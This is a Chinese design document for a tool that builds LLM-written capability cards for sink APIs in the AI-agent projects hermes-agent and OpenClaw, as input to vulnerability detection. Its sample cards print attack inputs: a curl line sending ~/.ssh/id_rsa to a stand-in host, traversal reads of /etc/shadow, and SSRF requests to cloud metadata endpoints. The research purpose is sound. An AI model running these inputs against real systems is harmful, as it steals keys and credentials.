# Sink API 能力评估方案（Oracle 构建）

> 管辖代码（见 `docs-map.yaml`）：`src/sink_capacity/**`。
>
> 首个实现项目是 hermes-agent（Python）；OpenClaw 通过独立 JavaScript/TypeScript sink pack 复用同一
> capability-card 与 terminal-constraint contract。本文实现公共方法
> [`design/common/detection-method.md`](../../common/detection-method.md) §「Sink Capability Oracle」：
> 「如何确定 Sink 点的实际执行能力域（确定 oracle）」。
>
> 输入三类材料：**① API 文档/规范　② sink API 自身的实现源码　③ 该 API 已有漏洞的 patch**，
> 由 LLM 为每个 sink API 合成一张**「能力描述卡」——用自然语言充分描述该 API 的能力 + 给出示例用法**，
> 作为 oracle。
>
> **本步范围**：只**充分描述 API 能干什么**（能力事实 + 示例）。**不写** gate、不写「应该检查什么」、
> 不做「gate 覆盖 ⊇? sink 能力」的匹配——匹配是**下一步**（§8），消费本步产出的能力卡。
>
> **已实现**（见 §14）：代码在 [`src/sink_capacity/`](../../../src/sink_capacity)。sink API 全集来自
> [`src/ql/call/sinks_af.qll`](../../../src/ql/call/sinks_af.qll) 的 `is_sink_af`（自动解析出 **49** 个顶层 disjunct：48 个 concrete sink API，加一个由 `ProjectModel` 在查询时解析的 `projectAdditionalSink` adapter hook）。
> 产出：一张**索引表**（记录全部 sink API）+ **每个 sink API 一份卡文档**（文件名即 sink API 名），
> 全部落在 [`sink-capability-cards/`](../../../src/sink_capacity/sink-capability-cards)。**生成的卡片用英文描述**（本设计文档仍中文）。

---

## 0. 定位：本方案在整个流水线里补哪块

```
step1 handler 入口(is_tool_handler) ─┐
step2 sink 清单(is_sink_af, 734)   ──┼─→ step3 handler→sink 链(cell) ─┐
                                     │                                │
本方案 = 给每个 sink API 造能力卡(ceiling) ─────────────────────────────┤
                                                                       ▼
                              下一步 §不一致面比对:  gate 覆盖域 ⊇? sink 能力域
                                             ↑ floor(gate-fte-design.md)  ↑ ceiling(本方案)
```

- **gate-fte-design.md** 产出 gate 的**实际覆盖域**（floor / 下界）。
- **本方案** 产出 sink API 的**实际执行能力域**（ceiling / 上界 / oracle）——**只描述，不比对**。
- 比对（ceiling ⊇? floor）在下一步做，消费本步的能力卡。

**所以本步的成败标准 = 能否「充分描述」API 的能力**，而不是能不能比对。

---

## 1. 一个前置判断：Sink 分两种，取材策略不同

step2 `sink-points.csv` / 各 CVE 的 `d5_sink_points` 里的 sink 原语分两类，Q1/Q2 的做法由此二分决定：

| 类型 | 代表（hermes 实测 d5 sink） | 能力从哪读 | 源码策略 |
|---|---|---|---|
| **A. 标准库 / 三方 API** | `subprocess.Popen`、`ptyprocess.spawn`、`pathlib.Path.read_text`、`httpx.AsyncClient.get`、`aiohttp.ClientSession.post`、`slack_sdk chat_postMessage` | **外部文档/规范**（权威、完整） | 基本**不看库源码**；仅默认行为文档不清时定向拉某个库函数 |
| **B. 项目内部 sink API / 封装** | CDP eval 封装 `CDPSupervisor._cdp`/`_ws.send`、`ShellFileOperations.read_file`、`provider.extract`（各 web provider）、`prompt_dangerous_approval`（用户同意交互） | **实现源码**（无文档）；以其自身函数体为准，必要时向下追到它落到的 A 类原语 | 见 §3：**只切该 API 自身函数体**（+向下少量跳），不切调用它的路径 |

---

## 2. 核心思想（三个决策）

**决策 A — oracle = 能力描述（不是义务、不是与 gate 的匹配）。**
本步只回答「这个 sink API 能干什么」，用**能力事实措辞**（「此 API *可*…」）+ **可运行示例**充分描述；
**不写**「gate 应检查什么」，也**不判**覆盖是否足够。把能力描述与 gate 匹配彻底解耦——匹配是下一步的事，
消费本步产出。这样本步可独立做全、做透，且能力卡可跨「不同 gate 实现/不同项目」复用。

**决策 B — 建模单位 = 每个具体 sink API（近乎相同的合并成一张卡）。**
卡描述的是**一个 sink API**（如 `subprocess.Popen`），用 `capability_class` 标签（process-spawn /
file-read / network-egress / user-consent / …）分组，用于检索与跨项目/跨语言对齐。
**描述以 d5 的 `problematic_parameter`（模型可控参数）为中心**：不泛泛讲整个 API，而是回答
「当攻击者控制**这个参数**（args / env / url / text / expression / 接收者 path），能驱动该 API 做出的
**效果全集**是什么」。

**决策 C — 接地 + 用历史 CVE 自测完备性。**
每条能力主张与每个示例都挂 `provenance`（文档章节 / 源码行）；卡的完备性用历史 CVE 自测（§7）：
卡的 `capability` + `example_usage` 必须**能描述/复现**每个 CVE 所利用的那种能力——描述不到 = 卡不完备。

---

## 3. Q2 · 喂什么源码给 LLM（sink API 自身的实现，不是 t→sinkArg）

**修正前一版的错误**：描述能力要读的是 **sink API 本身（被调方）的实现**，方向是「以 sink 为中心
向下到真实副作用」；**不是**读 handler→sink 的那条 `t→sinkArg` 污点路径（那是调用方，属于下一步
gate 匹配才需要）。

### 3.1 两类 sink API 的取材

- **B 类·项目内部 sink API**（如 CDP eval 的 `CDPSupervisor._cdp` / `_ws.send`、
`ShellFileOperations.read_file` / `prompt_dangerous_approval`）：**告诉 agent 实现位置（file:line），由它自己用 Read/Grep 打开、
  并沿被调关系向下追**到真实副作用原语（如 `ShellFileOperations.read_file → self._exec → … → Popen`），
  基于真实读到的代码写卡。**不再由我们预先 grep 函数体塞进 prompt**（见 §4.3 / §15）。
- **A 类·库/stdlib sink API**（`Popen` / `read_text` / `httpx.get` / `chat_postMessage`）：其行为由
  **权威文档/规范**（§4）描述——文档就是「对该实现行为的权威描述」，**基本不喂库源码**。仅当某默认
  行为文档不清（如某版本 `httpx` 的重定向默认值）时，才定向拉那**一个**库函数源码。

### 3.2 调用形态从 d5 免费获得（无需读 t→sinkArg）

d5 的 `evidence` + `problematic_parameter` 已经给出本项目里这个 sink 的**具体调用形态**，例如：
- `subprocess.Popen(["<shell>","-lic","set +m; <command>"])`（terminal，`d5.evidence`）；
- `target_file.read_text(...)`，`target_file = skill_dir / file_path`（Issue-220）；
- `client.get(image_url)`（vision，`d5.problematic_parameter = image_url`）。

用它把「API 通用能力」**特化到「本项目这个 sink 的能力」**（如 Popen 被 `-lic` 包裹 → 该 sink 实际带
「登录+交互 shell」能力）。**这一步不需要也不读 t→sinkArg 路径。**

### 3.3 控大小

只切「sink API 自身函数体（+向下到真实原语的少量跳）」，库 API 不喂源码用文档；同一 API 的多处命中
**复用同一张卡**（1216 sink 落到 ~9 个 `capability_class`、数十个不同 API）。

---

## 4. Q1 · sink API 文档怎么获取（已落地）

答案是**分层、以「安装包内省」为主、基本离线、可复现**。实现见
[`src/sink_capacity/doc_sources.py`](../../../src/sink_capacity/doc_sources.py)。

### 4.1 第 1 层（主）· 安装包内省（版本正确、可复现、免联网）

直接在**目标项目所用的运行环境**里 `import` 这个 API 对象，用 `inspect` 读它的**签名 + docstring**：
```python
inspect.signature(subprocess.Popen)          # -> 真实签名(含 close_fds/restore_signals 等默认)
inspect.getdoc(subprocess.Popen)             # -> 权威 docstring
importlib.import_module("httpx").__version__ # -> 锁定版本
```
- 对 **stdlib + 已安装三方包**（本机实测 `httpx 0.28.1` / `aiohttp 3.13.4` / `requests 2.32.5` /
  `markdown 3.10.2` 均可内省）直接可用；给 LLM 的是**该版本的权威事实**，不是记忆。
- 把 `sink API 名` → `import 路径` 用一张小 registry 映射（`subprocess.Popen`、`pathlib.Path.read_text`、
  `httpx.AsyncClient.get`、`builtins.open` …）。C 实现无 `inspect.signature` 时只取 docstring，静默降级。

### 4.2 第 2 层 · 官方文档「爬一次、存本地、之后复用本地」（已实现）

`DOC_URLS`：每个 API → 官方文档/规范 URL（Python docs / httpx / requests / markdown …）。
`fetch_and_cache_doc()` 的策略正是你要求的**先爬取一份到本地、本地存在就直接用本地**：

- **首次**：GET 该 URL → HTML→text → 按锚点（如 `#subprocess.Popen`）裁出**聚焦片段** → 存到
  `src/sink_capacity/api-docs-snapshots/<api>.txt`（复用的片段）+ `<api>.html`（原始全文，供复现）+
  `manifest.json`（URL / fetched_at / sha256）。
- **之后**：`<api>.txt` 存在且未 `--refresh-docs` → **直接读本地，零联网**（实测复用一次 0.09s）。
- **离线/不可达**：`fetch` 失败返回 `None`，静默回退到第 1 层内省（不影响出卡）。
- 该本地片段与内省 docstring 一起喂给 LLM，并把 URL 写进卡的 `provenance` 供追溯。

一次性把全部 `DOC_URLS` 爬进快照：`python3 -m src.sink_capacity.main --crawl-docs`
（实测 15/15 成功）。**好处**：可复现（锁快照）、可离线复用、评审可直接看本地 `.txt`/`.html`。

### 4.3 第 3 层 · 项目内部 sink API：**告诉 agent 实现位置，让它自己读**（已改为 agent 读）

B 类内部封装（`file_ops.read_file` / `supervisor.evaluate_runtime` / `_run_browser_command` /
`camofox_navigate` / `provider.extract`）没有库文档。**不再由我们 grep 出函数体塞进 prompt**，而是
（见 §15 的 agent 化）：`project_source()` 只负责**定位** `def`（file:line），把这个位置告诉 agent，
由 **agent（claude CLI）用 Read/Grep 工具自己打开实现、并沿被调关系向下追**到真实原语
（如 `ShellFileOperations.read_file → self._exec → … → Popen`、`evaluate_runtime → _cdp → _ws.send`），
基于**真实读到的代码**写卡。好处：agent 能跟进多跳、看全上下文，比固定 60 行 grep 片段更接地。
（实测：CDP WebSocket sink 在当前源码中落到 `browser_cdp_tool.py:168 → ws.send`
后生成，能力枚举到 `userGesture`/`awaitPromise` 等代码里的细节。）

### 4.4 第 4 层 · 安全知识库（把能力描述到「极端/放大点」）

`SECURITY_REFS`（按 `capability_class`）：GTFOBins/LOLBins、OWASP SSRF cheat-sheet（内网段/云元数据/
DNS rebinding/重定向）、CWE（CWE-22/78/918/89/95…）。作为 provenance + 提示 LLM 枚举极端子能力；这些是
LLM 极熟的公开知识，靠其参数化知识 + 上述接地材料即可，无需实时抓取。

> **效率取巧**：stdlib/知名 API 是 LLM 极熟知识 → LLM 凭知识生成叙述，**用第 1 层内省的签名/docstring
> 做接地校验**（文档当 ground-truth checker，不只当生成源）。

---

## 5. Q3 · Oracle 怎么表示（本方案的核心）：能力描述卡

**目标：充分描述这个 sink API 能干什么 + 给出示例用法。** 纯能力描述，不含 gate、不含「应检查什么」。

### 5.1 `sink-capability-card/v2` 字段

| 字段 | 内容 |
|---|---|
| `schema_version` / `card_id` | 固定为 `sink-capability-card/v2`；`SCC-*` 绑定 API family、runtime 和 capability class，不绑定 normative policy 文本 |
| `api` / `api_family` / `runtime` | 被描述的具体签名、跨 callsite API family，以及 language/ecosystem/package/version |
| `capability_class` | 分组标签（process-spawn / file-read / network-egress / code-eval / delivery / …），用于检索与跨语言对齐 |
| `bound_sinks` | 本项目哪些 d5 / sink-points 位置是这个 API（含各自的调用形态） |
| `normative_authority` | 普通卡固定为 `capability-facts-only`；危险能力事实不能单独生成规范性安全义务 |
| `roles[].bindings[]` | role ID、说明、exact API binding expression，以及该 binding 是否 `caller_bindable`；内部派生/provider 值不得伪装为 caller input |
| **`facets[]`** | 每个独立能力效果及其 role IDs、显式 activation predicates；shell/redirect/optional-role 等条件能力不得写成无条件事实 |
| `library_guarantees[]` | 具体库/runtime 已保证的限制；例如 Requests 默认只注册 `http://`、`https://` adapter，不能声称 `file://`/`ftp://`/`dict://`/`gopher://` 能力 |
| `defaults[]` | role 省略时才激活的默认值、其安全效果与 activation predicates |
| **`example_usage`** | **两档示例（可运行）：`benign`（正常用法）+ `capability_edge`（触达能力边界的用法）** |
| `provenance` | 权威文档/规范章节 + 本项目实现源码位置（每条能力/示例可追溯） |
| `policy_contract`（可选） | 仅 source-owned `user-consent` approval policy；仍使用 `approval-policy-contract/v1`，不参与 `SCC-*` identity |

> 不再有普通卡 `obligation` / `observable_signal`。配置相关性不再只埋在自然语言中，而是由
> `facets[].activation`、`defaults[].activation` 和 `library_guarantees[]` 机器可判定地表达。唯一例外是
> source-owned approval `policy_contract`；普通卡本体始终无 normative authority。

### 5.2 三条「充分描述」原则

1. **描述能力上限/极端**：写这个 API *能*做到的最危险的事（能力事实措辞），把子能力**枚举全**
   （如 SSRF 的 internal-ip / metadata / redirect / DNS-rebinding / scheme 逐条列在 `capability` 里）。
   —— 枚举得细，下一步比对才能精确点到漏洞类；粗写「能联网」就会漏。
2. **点出隐式默认值**：继承环境、跟随重定向、跟随符号链接、connect 时解析 DNS…… 这些是「看不见的能力」，
   最容易被漏描述。
3. **每条能力配示例**：尤其 `capability_edge` 档，把抽象能力钉在可运行代码上；示例即「这个 API 被推到
   能力边界时长什么样」，也是下一步构造 PoC 的种子。

### 5.3 表示格式与落盘（已按额外要求实现）

- **卡片语言：英文**（`example_usage` 为可运行代码）。
- **一个 sink API 一份文档**：`sinks_af.qll` 的每个 disjunct 独立成卡，**文件名即 sink API 名**
  （slug，如 `subprocess.Popen.md`、`pathlib.Path.read_text.md`、`builtins.open.read.md`），全部放在
  一个目录 [`sink-capability-cards/`](../../../src/sink_capacity/sink-capability-cards)。
- **一张索引表记录全部 sink API**：`src/sink_capacity/sink-capability-cards/index.md`，列
  `# / card / api / capability_class / kind / doc source / qll line`，每行链接到对应卡文档。
- 卡片正文 = 一个严格的 v2 ```yaml 块。`card_contract.parse_capability_card()` 校验 schema、稳定
  identity、role/binding 唯一性、facet/default 引用、activation predicates，以及 approval policy 限域。

### 5.4 Chain Effective Capability View

API-level card 是能力上限，不直接等于某条 call chain 的可利用能力。确定性派生器按
`(project, revision, chain_id)` 联结 semantic chain、card、call shape 和 field-flow rows，输出
`effective-capability-view/v1`：

- exact matched role bindings、source facets、transforms；
- authority：`model-arbitrary | model-component | model-basename | model-enum |
  internal-derived | operator-config | provider-response | fixed`；
- 显式 `boundaries`、`actual_effects`、`call_shape_predicates`；
- active/inactive facets、library guarantees 和 defaults，并保留每个 activation 的通过/失败 witness。

confirmed SameOrigin 的 caller-bindable binding 缺少更窄 authority 时默认 `model-arbitrary`。但 map selector
key、内部 UUID/临时路径、operator config 或 provider response 不因同处一条结构链就变成模型任意控制；field-flow
必须明确给出相应 authority。card 的普通事实在 view 中仍标记 `ordinary_card_normative=false`。
当前 114-card migration 对已知 Node/adapter family 绑定 TypeScript runtime，其余当前 family 绑定 Python
runtime；language/ecosystem/package/version 任一含 `unspecified` 或 `unresolved` 都 fail closed，禁止跨 runtime
复用 defaults/guarantees。

---

## 6. 生产管线（每个 sink API 跑一次）

```
输入(三源) ─────────────────────────────────────────────────┐
 ① 文档/规范(§4)          → capability 事实、隐式默认值          │
 ② sink API 自身实现(§3)  → 具体行为、调用形态特化               │──▶ LLM ──▶ 能力描述卡(§5)
 ③ 该 API 已有 CVE patch  → 曾被放大到的能力面(高价值 capability_edge) │        │
 ④ 安全知识库(§4.1-2)     → 能力「极端档」的枚举完备性             │        ▼
                                                              完备性自测(§7): 卡能否描述每个 CVE 利用的能力? 否→补
```

**patch 用来充实 `capability` / `example_usage` 的「能力边界」档**——一个安全 patch 反映的是
「这个 API 曾被某种输入放大到什么危险效果」，正是最真实的能力边界示例（不是「应加什么检查」，那是下一步）。
patch 是 diff，很小，直接喂。**跨项目复用**：同一 API/能力上任何项目的 patch 都能充实同一张卡
（openclaw `exec` 的 patch 充实 process-spawn 卡）。

---

## 7. 完备性自测（用历史 CVE 检验「描述得够不够充分」）

每个历史 CVE 都利用了 sink API 的**某种能力**。所以**该 API 的能力卡必须能描述到这种能力**（体现在
`capability` 的枚举 + 一个对应的 `capability_edge` 示例里），否则说明卡漏描述了能力 → 补。
注意：这里测的是**能力描述的完备性**，不是「gate 该怎么查」。

| CVE | sink API | 卡必须描述到的能力 |
|---|---|---|
| Issue-220 | `Path.read_text` | 接收者路径经 `/` 拼接 + OS 解析 `..`/绝对路径 → 读出预期目录外文件 |
| Issue-8035 | `file_ops.read_file`（→ 底层读原语） | procfs 别名（`/proc/self/environ`）等价读进程环境 |
| Device-Blocking | `subprocess.Popen`（ShellFileOperations 读命令） | 经 shell 读 `/dev/*` 设备路径 |
| 762f7e97 | `prompt_dangerous_approval` | 向用户呈现模型生成的命令及危险说明，并收集 once/session/always/deny 范围的同意决定 |
| 6a320e8b | `subprocess.Popen` | 子进程通过 `env=` 继承/带入 messaging 凭据 |
| fd335a4e | `subprocess.Popen` | 单命令串经 shell 展开为任意命令链/危险模式 |
| CVE-Code-Execution-Mode | `subprocess.Popen`（execute_code 子进程） | 执行模型写入的 `script.py`（任意 Python） |
| Issue-8033 | `httpx.AsyncClient.get` / provider extract | connect 时解析 DNS（rebinding）+ 跟随重定向 + 内网/元数据 host |
| GHSA browser-eval | CDP `Runtime.evaluate`（`_ws.send`） | 在页面运行时执行任意 JS（导航/读 DOM/发起 fetch 外泄） |
| Discord-Mention | `chat_postMessage` / `aiohttp session.post` | 投递的 `text`/`message` 被平台渲染（mass-mention、markdown、超链接） |

若某卡描述不到对应能力 = 卡有漏。这把「描述是否充分」变成可验证的。

---

## 8. 下一步（不在本步范围）：能力卡如何被用于比对

仅作衔接说明，**本步不做**：下一步对 step3 `handler-sink-chains.csv` 的每个 cell，取该 sink 的能力卡
（ceiling）与 gate-fte 产出的 gate 覆盖域（floor）比对，判 `gate 覆盖 ⊇? 卡里枚举的能力`；卡的
`capability_edge` 示例同时充当 PoC 种子。**「应检查什么」在那一步由能力反推，不在能力卡里预置。**

---

## 9. 样板卡（用真实 hermes d5 sink 写全，三张）

> 下面三张是**设计示意**（中文，便于对照本文）。**工具实际生成的卡片是英文**，逐个 sink API 落在
> [`sink-capability-cards/`](../../../src/sink_capacity/sink-capability-cards)（如 `subprocess.Popen.md`）。字段 schema 与此处一致。

### 9.1 `subprocess.Popen`（6a320e8b / fd335a4e / Device-Blocking / execute_code 共用）

```yaml
api: subprocess.Popen(args, *, shell=False, env=None, cwd=None, ...)
capability_class: process-spawn
bound_sinks:
  - tools/environments/local.py:595       # terminal 前台; args=["<shell>","-lic","set +m; <command>"]
  - tools/process_registry.py:557/600     # 后台 PTY(ptyprocess.spawn) / pipe(Popen); 同 -lic 包裹
  - tools/code_execution_tool.py:1045      # execute_code 子进程; args=[sys.executable,"script.py"], env=child_env
controlled_param: args(命令串) / env(子进程环境) / cwd(工作目录)
capability: |
  创建子进程执行程序,自身无任何安全语义。控制各参数可驱动:
  - args(经 shell): 本项目以 ["<shell>","-lic","set +m; <command>"] 调用 → command 整串交
    **登录+交互 shell** 解释,可展开为命令链(; && ||)、管道(|)、重定向(> < >>)、命令替换 $()/``、
    glob、后台(&);登录 shell 还会加载 ~/.bashrc 等启动文件(可再引入行为);
  - args(即便不过 shell)可经「名义无害实则可 exec」的程序放大: find -exec、xargs、awk 'system()'、
    tar --to-command、git -c core.sshCommand、解释器 python -c / perl -e、sudo/sh 再起 shell;
  - 具体到 CVE 覆盖的子能力: 经 shell 读 /dev/* 设备(Device-Blocking)、单命令串展开为任意危险模式
    (fd335a4e)、执行模型写入的 script.py(execute_code / CVE-Code-Execution-Mode);
  - env: env=None 时子进程继承调用方整个 os.environ(含 API key / messaging 凭据; 6a320e8b);
    传 dict 则替换/叠加;
  - cwd: 决定工作目录,相对路径与部分程序的隐式文件访问以此为基,可逃出预期目录;
  - 子进程默认继承父进程 fd / uid-gid / 信号处置,无沙箱。
implicit_defaults: |
  - shell=False 默认不解释元字符,但本项目主动以 "-lic" 包裹 → 引入登录+交互 shell;
  - env=None 继承父环境;
  - Popen 本身零校验。
example_usage:
  benign: |
    subprocess.Popen(["ls", "-l", "/tmp"])
  capability_edge: |
    # 单字符串→任意命令链(shell 全能力 + 外泄)
    subprocess.Popen(["bash","-lic","echo ok; curl http://x/?$(cat ~/.ssh/id_rsa)"])
    # LOLBin: 名义查找,实为任意执行
    subprocess.Popen(["find",".","-exec","sh","-c","id",";"])
    # env 继承 → 凭据泄露
    subprocess.Popen("printenv", shell=True)
    # 读设备(Device-Blocking 那类)
    subprocess.Popen(["bash","-lic","cat /dev/./zero | head -c1"])
provenance:
  - Python docs: subprocess §Popen / §Frequently Used Arguments / §Security Considerations
  - GTFOBins (find/xargs/awk/tar/git exec)
  - hermes: environments/local.py:595, process_registry.py:557/600, code_execution_tool.py:1045
  - patches: 6a320e8b(env 清洗), fd335a4e(危险 pattern 补全)
```

### 9.2 `pathlib.Path.read_text`（Issue-220）

```yaml
api: pathlib.Path.read_text(encoding=None, errors=None)
capability_class: file-read
bound_sinks:
  - tools/skills_tool.py:1268              # target_file = skill_dir / file_path; file_path 模型可控
controlled_param: 接收者 Path(由 skill_dir / file_path 拼成)
capability: |
  打开接收者路径、读取全部字节并按 encoding 解码返回。控制路径分量可驱动:
  - pathlib '/' 拼接语义: 若右操作数是绝对路径,直接丢弃左侧根 → 跳到任意绝对路径;
  - OS 在 open 时解析 '..' → 逐级跳出 skill_dir(目录穿越);
  - open 默认**跟随符号链接** → 读链接指向的区外目标(含硬链接别名);
  - 可读特殊文件: /proc/self/environ(进程环境)、/dev/*、命名管道等;
  - 一次性读入内存,无大小上限。
  能力边界(不在本 API 内、需注意): read_text 本身**不做 expanduser**,'Path("~/x")' 读字面 '~' 目录;
  Device-Blocking 里的 '~' 展开发生在别处的 expanduser 调用,不是 read_text 的能力。
implicit_defaults: |
  - 跟随符号链接(无 O_NOFOLLOW);
  - 不做任何路径校验 / 不 expanduser。
example_usage:
  benign: |
    (Path("skills") / "demo" / "SKILL.md").read_text(encoding="utf-8")
  capability_edge: |
    (Path("skills") / "../../../../etc/passwd").read_text()   # '..' 穿越
    (Path("skills") / "/etc/shadow").read_text()              # 绝对路径吞掉左根
    Path("/proc/self/environ").read_text(errors="ignore")     # procfs 读环境
provenance:
  - Python docs: pathlib PurePath.__truediv__ / Path.read_text / Path.open; open(2) 符号链接跟随
  - hermes: skills_tool.py:1268
  - patch: Issue-220(skill 路径穿越修复)
```

### 9.3 `httpx.AsyncClient.get`（Issue-8033；两处命中一张卡）

```yaml
api: httpx.AsyncClient.get(url, *, headers=..., follow_redirects=<client 默认>)
capability_class: network-egress
bound_sinks:
  - tools/vision_tools.py:206              # client.get(image_url)
  - gateway/platforms/base.py:654          # client.get(url)
  # 同类还有 provider extract(Firecrawl.scrape / Exa.get_contents / Parallel.beta.extract /
  #   Tavily httpx.post),各自另立卡但 capability_class 同为 network-egress
controlled_param: url
capability: |
  对 url 发起 HTTP GET。控制 url 可驱动(SSRF 子能力逐条列全):
  - internal-ip: host 可为内网/回环/链路本地/保留段地址;
  - metadata-ip: 可打云元数据端点(169.254.169.254、metadata.google.internal);
  - dns-rebinding: DNS 在**建立连接时**才解析,与任何预检时刻的解析可不同(TTL=0 域名可重绑定→TOCTOU);
  - redirect: 若 follow_redirects 开启,3xx 被自动跟随,可从「看似安全」URL 跳到内网目标;
  - scheme: scheme 决定协议(httpx 处理 http/https);
  - port: 端口任意(可探测内网服务)。
implicit_defaults: |
  - follow_redirects 默认值随 httpx 版本/实例配置而定 → 是否包含「重定向跳转」能力需按 lockfile
    版本核实,并看该 AsyncClient 实例构造时是否显式设置(§4 pin 版本 + §3 看实例构造);
  - 默认校验 TLS;
  - DNS per-connect(rebinding 能力恒存在)。
example_usage:
  benign: |
    await client.get("https://api.example.com/x")
  capability_edge: |
    await client.get("http://169.254.169.254/latest/meta-data/")   # 云元数据
    await client.get("http://rebind.attacker.tld/")                # 解析→内网(rebinding)
    # 若 follow_redirects=True: 外部 URL 302 → http://127.0.0.1:6379/ (跳内网)
provenance:
  - httpx docs: AsyncClient §get / §Redirects / DNS 解析时机
  - OWASP SSRF cheat sheet (internal ranges / cloud metadata / DNS rebinding)
  - hermes: vision_tools.py:206, gateway/platforms/base.py:654
  - patch: Issue-8033(SSRF 预检 TOCTOU)
```

> 其余同构（按 §5 schema、§7 自测补全）：
> - **CDP `Runtime.evaluate`（`CDPSupervisor._ws.send(json.dumps(payload))`, GHSA browser-eval）**：
>   capability = 在页面运行时执行任意 JS —— `window.location=` 导航(可到内网)、读 DOM/cookie/
>   localStorage、发起 fetch 外泄；`capability_edge` = `{"expression":"fetch('http://169.254.169.254/').then(r=>r.text())"}`。
> - **`slack_sdk WebClient.chat_postMessage` / `aiohttp.ClientSession.post`（Discord-Mention）**：
>   capability = 投递任意 `text`/`message`,平台会**渲染** markdown、超链接、`@everyone`/`<!channel>`
>   群体提及；`capability_edge` = 含 mass-mention 与 `javascript:`/HTML 的内容。

---

## 10. 多语言复用（对应问题 5）

- **`capability_class` 叙述骨架跨语言复用**：process-spawn 的能力叙述（shell 展开 / env 继承 / LOLBin
  放大）对 Python `Popen`、Go `os/exec.Command`、TS `child_process.spawn` 是同一套。
- **每种语言的具体 API 各出一张卡**：填该语言的 `api` 签名、`implicit_defaults`（如 Go 无 `shell=True`，
  但 `exec.Command("sh","-c",...)` 触发同样的 shell 展开能力）、`bound_sinks`、`provenance`。
- 叙述骨架不动，跨 hermes / openclaw / goclaw 复用。

---

## 11. 产出物（已生成，见 §14）

| 路径 | 内容 |
|---|---|
| `design/hermes-agent/sink/debug/script/process_sink_data.py` | 在 `codeql-db/hermes-agent-db` 上运行 `get_sinks.ql`，规范化 sink callsite 并生成确定性中间报告 |
| `design/hermes-agent/sink/debug/script/sink-points.csv` | 新 DB 的去重 sink callsite 清单（`file / line / sink`） |
| `design/hermes-agent/sink/debug/script/sink-summary.csv` | 按 sink label 聚合的 callsite / 文件数 |
| `design/hermes-agent/sink/debug/script/sink-report.md` | DB 元数据、总量、主要 sink label 与文件分布；不混入跨 commit 的 D5 覆盖结论 |
| `design/hermes-agent/sink/debug/script/sink-coverage.csv` | `groundtruth/new-vuls/*.json` 中每条 `d5_sink_points` 的 method-name 覆盖明细 |
| `design/hermes-agent/sink/debug/sink-coverage.md` | 按 JSON 汇总及逐 sink 的 method-name 覆盖报告 |
| `src/sink_capacity/` | 实现代码（提取 + 取文档 + 生成卡） |
| `src/sink_capacity/sink-capability-cards/index.md` | **索引表**：`sinks_af.qll` 的 48 个 concrete sink API；adapter hook 本身不是 capability，不单独建卡 |
| `src/sink_capacity/sink-capability-cards/<api>.md` | **每个 sink API 一份英文能力卡**（文件名即 API 名） |
| `design/hermes-agent/sink-capability-completeness.md`（后续） | §7 的历史 CVE 完备性自测结果（可基于生成卡自动/半自动核对） |
| `src/sink_capacity/api-docs-snapshots/` | 官方文档本地快照（已爬 15 个：`<api>.txt` 复用片段 + `<api>.html` 原始 + `manifest.json`） |

## 12. 与现有资产的关系（复用，不重造）

| 来源 | 产物 | 在本方案中的角色 |
|---|---|---|
| step2 | `src/ql/call/sinks_af.qll` / `sink-points.csv`（当前 DB：871 sink callsite） | sink API 清单 = 能力卡的建卡对象；disjunct 天然分 `capability_class` |
| CVE | `groundtruth/new-vuls/` 中 9 个 JSON 的 20 条 `d5_sink_points` | 提供 `api` / `controlled_param` / 调用形态（`evidence`）→ 直接喂建卡 |
| CVE | 各 CVE 的 patch | §6 充实 `capability_edge` 的来源 + §7 完备性自测基准 |
| step3 | `handler-sink-chains.csv` | **下一步**（§8 比对）用；本步不用 |
| gate | `gate-fte-design.md` / `gate-migration-plan.md` | **下一步**消费本步能力卡做 ⊇ 比对；本步只产 ceiling |

## 13. 已知边界 / 风险

1. **LLM 幻觉**：靠 `provenance`（每条能力/示例挂 doc 章节或源码行）+ 历史 CVE 完备性自测（§7）
   兜底；未接地的能力主张不入卡。
2. **文档版本漂移**：能力默认值随版本变（§4 按 lockfile pin + 离线快照）；卡中把版本相关能力
   （如 httpx 重定向默认）显式标注「需按版本核实」。
3. **完备性只对已知能力**：卡靠文档 + 安全知识库 + 历史 CVE 覆盖已知能力面；全新利用手法仍可能漏描述
   —— 故 `capability_edge` 目录随新 CVE 持续 enrich（跨项目 patch 汇入同一卡）。
4. **B 类 sink API 的向下追踪**：若封装经工厂/缓存转发，points-to 可能解析不到真实原语 → 退回按
   receiver 名切片（复用 `src/ql/call/call.qll` 的 `getServiceHandle` 思路），或在卡中标注「落点未定」。

---

## 14. 实现（`src/sink_capacity/`）

在通用四阶段 pipeline 中，能力卡还承担 terminal constraint 的单一事实源。Stage 2 对每个 concrete sink
callsite 生成一条 `sink-constraints.csv`：稳定 sink/constraint ID、API/location、Source 控制实参、capability
class、AST call shape、卡路径和 digest。一个 sink point 无论被多少条结构链共享都只有一条 constraint；没有
卡映射立即失败。该 constraint 不进入 GateSlice/LLM prompt，只在 Stage 4 的 `CallChainSemanticIRV3` 中与
ordered `gates[]` 并列。

project adapter 可补共享 catalog 无法表达的 callable sink shape。AstrBot 的
`to_thread(Path(path).read_bytes)` 以 callback receiver 作为受控值并映射到
`pathlib.Path.read_bytes` 卡；`file_path.open("rb")` 映射到 `Path.open` file-read 卡。
`LocalFileSystemComponent.write_file._run` 使用 `open(abs_path, mode, ...)`，mode 是参数而非 literal，因此
Stage 2 同时读取 AST enclosing function，把 `write_file` 中该动态 mode call 归为 `file-write`；不能按
“没有 `"w"` literal”退回 file-read。

OpenClaw 不把 TypeScript sink 塞入 Python 的 `src/ql/call/sinks_af.qll`。其独立
`src/ql-js/call/sinks_af.qll` 以 `DataFlow::CallNode` 暴露 canonical ID、label、capability、boundary 与
controlled facet；规则优先解析 module/API identity，并对 `node.invoke`、gateway、browser/message delegation
要求 literal action、receiver、callback position 或 payload field。只有真实执行跨出 core `src/**/*.ts`
模型时，才把能力明确的 RPC/callback/external-tool call 作为 terminal boundary。多个 GT sink 引用可复用同一
canonical rule，但每个 concrete callsite 仍只能生成一条 constraint；argv/env/cwd/path/content 等 facet 合并在
该 constraint 的 `controlled_argument` 字段。Node process/fs/fetch 与 OpenClaw browser、delivery、RPC boundary
卡位于同一 `sink-capability-cards/` 目录，由 Stage 2 直接校验路径和 SHA-256。

| 模块 | 职责 |
|---|---|
